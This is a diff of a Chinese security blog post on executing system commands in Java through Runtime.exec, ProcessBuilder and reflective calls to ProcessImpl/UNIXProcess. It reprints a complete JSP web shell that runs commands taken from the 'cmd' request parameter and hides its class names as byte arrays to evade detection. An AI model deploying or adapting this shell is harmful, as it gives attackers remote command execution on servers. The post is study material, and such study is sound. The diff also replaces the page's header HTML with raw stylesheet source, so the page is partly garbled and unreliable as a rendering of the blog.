@@ -44,93 +44,286 @@
     <div class="page-main-content">
 
         <div class="page-main-content-top">
-            <header class="header-wrapper">
+            $logo-title-font-size = 2.2rem;
+$pc-search-icon-font-size = 1.5rem;
+$menu-bar-line-height = 2.5px;
 
-    <div class="header-content">
-        <div class="left">
-            <a class="logo-title" href="/">
-                p1k&#39;s blog
-            </a>
-        </div>
+.header-wrapper {
+  width: 100%;
+  height: 100%;
+  box-sizing: border-box;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: var(--background-color);
+  padding-top: $scroll-progress-bar-height;
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
-                                HOME
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
-                                ARCHIVES
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/links"
-                            >
-                                LINKS
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/about"
-                            >
-                                ABOUT
-                            </a>
-                        </li>
-                    
-                    
-                </ul>
-            </div>
-            <div class="mobile">
-                
-                <div class="icon-item menu-bar">
-                    <div class="menu-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
+  hover-style(false, 0, 0);
 
-    <div class="header-drawer">
-        <ul class="drawer-menu-list">
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">HOME</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">ARCHIVES</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/links">LINKS</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/about">ABOUT</a>
-                </li>
-            
-        </ul>
-    </div>
+  .header-content {
+    position: relative;
+    height: 100%;
+    width: $main-content-width;
+    max-width: $content-max-width;
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+    z-index: $z-index-5;
 
-    <div class="window-mask"></div>
 
-</header>
+    &.has-first-screen {
+      max-width: $content-max-width * 1.2;
+    }
 
+    +keep-tablet() {
+      width: $main-content-width-tablet;
+    }
+
+    +keep-mobile() {
+      width: $main-content-width-mobile;
+    }
+
+    .left {
+      display: flex;
+      align-items: center;
+      transition-t("transform", "0", "0.2", "linear");
+
+      .header-shrink & {
+        transform: scale(0.85);
+        transform-origin: left;
+
+      }
+
+      .logo-title {
+        font-size: $logo-title-font-size;
+        font-weight: bold;
+        letter-spacing: 1px;
+        line-height: 1;
+        color: var(--first-text-color);
+
+        +keep-tablet() {
+          font-size: $logo-title-font-size * 0.9;
+        }
+
+        +keep-mobile() {
+          font-size: $logo-title-font-size * 0.8;
+        }
+      }
+    }
+
+
+    .right {
+
+      .pc {
+
+        .menu-list {
+          display: flex;
+          align-items: center;
+
+          +keep-tablet() {
+            display: none;
+          }
+
+
+          .menu-item {
+            float: left;
+            position: relative;
+            margin-left: 30px;
+            font-size: 1rem;
+            cursor: pointer;
+            color: var(--default-text-color);
+
+            &:first-child {
+              margin-left: 0;
+            }
+
+
+            a:hover, .active {
+
+              &::after {
+                content: '';
+                position: absolute;
+                bottom: -10px;
+                left: 50%;
+                width: 100%;
+                height: 2px;
+                transform: translateX(-50%);
+                background: var(--primary-color);
+                transition-t("transform, bottom", "0, 0", "0.2, 0.2", "linear, linear");
+
+                .header-shrink & {
+                  bottom: -($header-shrink-height / 2 - 12);
+                }
+              }
+            }
+
+            &.search {
+              font-size: $pc-search-icon-font-size;
+              margin-left: 26px;
+
+              i {
+                color: var(--default-text-color);
+              }
+
+            }
+          }
+
+
+        }
+
+      }
+
+
+      .mobile {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+
+        .icon-item {
+          display: none;
+          position: relative;
+          cursor: pointer;
+          font-size: 18px;
+          margin-left: 12px;
+          width: 20px;
+          height: 20px;
+          color: var(--default-text-color);
+
+          i {
+            color: var(--default-text-color);
+          }
+
+          &:first-child {
+            margin-left: 0;
+          }
+
+          +keep-tablet() {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+          }
+        }
+
+        .menu-bar {
+
+          .menu-bar-middle {
+            width: 18px;
+            height: $menu-bar-line-height;
+            position: relative;
+            background: var(--default-text-color);
+
+            .header-drawer-show & {
+              background: transparent;
+            }
+
+
+            &::before, &::after {
+              content: '';
+              position: absolute;
+              left: 0;
+              width: 100%;
+              height: $menu-bar-line-height;
+              background: var(--default-text-color);
+              transition-t("transform", "0", "0.38", "ease");
+            }
+
+
+            &::before {
+              top: -6px;
+
+              .header-drawer-show & {
+                transform: translateY(6px) rotate(45deg);
+              }
+            }
+
+
+            &::after {
+              bottom: -6px;
+
+              .header-drawer-show & {
+                transform: translateY(-6px) rotate(-45deg);
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+
+
+  .header-drawer {
+    width: 100%;
+    padding: $header-height 0 20px 0;
+    position: absolute;
+    top: 0;
+    left: 0;
+    transform: scaleY(0);
+    transform-origin: top;
+    z-index: $z-index-2;
+    background: var(--background-color);
+    transition-t("transform", "0", "0.38", "ease");
+
+    .header-drawer-show & {
+      transform: scaleY(1);
+    }
+
+    .drawer-menu-list {
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
+
+      .drawer-menu-item {
+        font-size: 1rem;
+        margin: 6px 0;
+        height: 38px;
+
+        a {
+          padding: 6px 20px;
+          border-radius: 20px;
+          color: var(--default-text-color);
+
+          &:hover {
+            color: var(--second-text-color);
+            border: 1px solid var(--default-text-color);
+          }
+
+
+          &.active {
+            border: 1px solid var(--default-text-color);
+            color: var(--second-text-color);
+          }
+        }
+
+
+      }
+    }
+  }
+
+
+  .window-mask {
+    position: absolute;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    background: rgba(0, 0, 0, 0.4);
+    z-index: $z-index-1;
+    visibility: hidden;
+    opacity: 0;
+    transition-t("transform, opacity", "0, 0", "0.38, 0.38", "ease, ease");
+
+    .header-drawer-show & {
+      visibility: visible;
+      opacity: 1;
+    }
+  }
+
+}
+
+.header-drawer-show {
+  overflow: hidden;
+}
 
         </div>
 
@@ -154,7 +347,7 @@
                 <div class="info">
                     <div class="author">
                         <span class="name">p1k</span>
-                        <span class="level">Lv6</span>
+                        <span class="level">Lv7</span>
                     </div>
                     <div class="meta-info">
                         <div class="article-meta-info">
@@ -205,10 +398,16 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">    m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
-
-
-
-
+<p>在跟踪exec方法执行命令时，发现的一点问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    String cmd &#x3D;&quot;echo xxx&gt;test.txt&quot;;</span><br><span class="line">    Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>
+<p>exec方法实质上也是调用的processBuilder类的start方法来执行命令。</p>
+<p>使用exec执行命令时，需要调用StringTokenizer类来对参数进行分割，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StringTokenizer st = <span class="keyword">new</span> StringTokenizer(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> String[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; st.hasMoreTokens(); i++)<span class="comment">//最主要的分割点在这里，会把传入的命令根据空格拆分成一个数组</span></span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);<span class="comment">//最后传入重载的exec方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后会把这个数组传给create方法  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handle = create(cmdstr, envblock, path,</span><br><span class="line">                stdHandles, redirectErrorStream);</span><br></pre></td></tr></table></figure>
+<p>第一个空格前的会被当作模块传入 ，第一个空格后的都会被当作参数传入，不会被当作模块</p>
+<p>之前的payload是<code>echo xxx&gt;test.txt</code>  echo会被当作一个模块，但是Windows下根本没有这个模块，他只是cmd里面的一个命令</p>
+<p>所以可以把cmd作为模块，命令作为参数  改成这样<code>cmd /c echo xxx&gt;test.txt</code></p>
 <h1 id="processBuilder"><a href="#processBuilder" class="headerlink" title="processBuilder"></a>processBuilder</h1><p>Runtime类的exec方法，在底层也是去调用了processBuilder类</p>
 <p>最基本的形式</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>
@@ -233,10 +432,27 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">    ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
+<p>processBuilder类在执行命令时，是不会根据空格把payload分割的，所以要想用processBuilder类来执行命令，必须得把命令和参数分开比如</p>
+<p>  <code>&quot;cmd \c echo xxx&gt;test.txt&quot;</code>  ==》应该写成<code>&quot;cmd&quot;,&quot;\c echo xxx&gt;test.txt&quot;</code> </p>
+<h1 id="UNIXProcess-ProcessImpl"><a href="#UNIXProcess-ProcessImpl" class="headerlink" title="UNIXProcess/ProcessImpl"></a>UNIXProcess/ProcessImpl</h1><p>这两个在JDK9合并成了一个</p>
+<p>Processlmpl是没有构造方法的，不能直接实例化，所以要通过反射来调用public的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String[] cmds = &#123;<span class="string">&quot;ipconfig&quot;</span>,<span class="string">&quot;/all&quot;</span>&#125;;</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">Method method = clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, <span class="keyword">new</span> String[]&#123;&#125;.getClass(), Map.class,String.class,ProcessBuilder.Redirect[].class,<span class="keyword">boolean</span>.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InputStream ins = ((Process) method.invoke(<span class="keyword">null</span>,cmds,<span class="keyword">null</span>,<span class="string">&quot;.&quot;</span>,<span class="keyword">null</span>,<span class="keyword">true</span>)).getInputStream();</span><br><span class="line">ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"><span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">while</span>((size = ins.read(bytes)) &gt; <span class="number">0</span>)</span><br><span class="line">    bos.write(bytes,<span class="number">0</span>,size);</span><br><span class="line">System.out.println(bos.toString());</span><br></pre></td></tr></table></figure>
 
 
 
 
+
+
+<p>知识盒子上的一个代码实例，</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">byte</span>[] toCString(String s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes  = s.getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>, result, <span class="number">0</span>, bytes.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="keyword">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">InputStream <span class="title">start</span><span class="params">(String[] strs)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// java.lang.UNIXProcess</span></span><br><span class="line">        String unixClass = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">85</span>, <span class="number">78</span>, <span class="number">73</span>, <span class="number">88</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// java.lang.ProcessImpl</span></span><br><span class="line">        String processClass = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>&#125;);</span><br><span class="line"></span><br><span class="line">        Class clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射创建UNIXProcess或者ProcessImpl</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(unixClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            clazz = Class.forName(processClass);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> strs != <span class="keyword">null</span> &amp;&amp; strs.length &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span></span><br><span class="line">        <span class="comment">// memory management in Java than in C.</span></span><br><span class="line">        <span class="keyword">byte</span>[][] args = <span class="keyword">new</span> <span class="keyword">byte</span>[strs.length - <span class="number">1</span>][];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> size = args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = strs[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] argBlock = <span class="keyword">new</span> <span class="keyword">byte</span>[size];</span><br><span class="line">        <span class="keyword">int</span>    i        = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// No need to write NUL bytes explicitly</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] envc    = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span>[] std_fds = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        FileInputStream  f0 = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream f1 = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream f2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// In theory, close() can throw IOException</span></span><br><span class="line">        <span class="comment">// (although it is rather unlikely to happen here)</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (f0 != <span class="keyword">null</span>) f0.close();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (f1 != <span class="keyword">null</span>) f1.close();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (f2 != <span class="keyword">null</span>) f2.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建UNIXProcess或者ProcessImpl实例</span></span><br><span class="line">        Object object = constructor.newInstance(</span><br><span class="line">                toCString(strs[<span class="number">0</span>]), argBlock, args.length,</span><br><span class="line">                <span class="keyword">null</span>, envc[<span class="number">0</span>], <span class="keyword">null</span>, std_fds, <span class="keyword">false</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取命令执行的InputStream</span></span><br><span class="line">        Method inMethod = object.getClass().getDeclaredMethod(<span class="string">&quot;getInputStream&quot;</span>);<span class="comment">//获取object类的getInputStream方法</span></span><br><span class="line">        inMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (InputStream) inMethod.invoke(object);<span class="comment">//拿到命令执行的结果，推测这个命令执行和上面的不同之处在于，在进行实例化的时候，就已经把命令执行了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">inputStreamToString</span><span class="params">(InputStream in, String charset)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">                charset = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span>                   a   = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">byte</span>[]                b   = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(out.toByteArray());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="keyword">null</span>)</span><br><span class="line">                in.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String[] str = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="keyword">null</span>) &#123;</span><br><span class="line">        InputStream in     = start(str);</span><br><span class="line">        String      result = inputStreamToString(in, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        out.println(result);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<p>参考链接</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221159">https://www.anquanke.com/post/id/221159<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
 
@@ -261,6 +477,21 @@
 
         
             <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/01/28/WAF%E7%BB%95%E8%BF%87/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">WAF绕过</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
                 
                 
                     <div class="article-next">
@@ -391,7 +622,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Runtime"><span class="nav-text">Runtime</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#processBuilder"><span class="nav-text">processBuilder</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Runtime"><span class="nav-text">Runtime</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#processBuilder"><span class="nav-text">processBuilder</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UNIXProcess-ProcessImpl"><span class="nav-text">UNIXProcess&#x2F;ProcessImpl</span></a></li></ol>
     </div>
 </div>
         </aside>
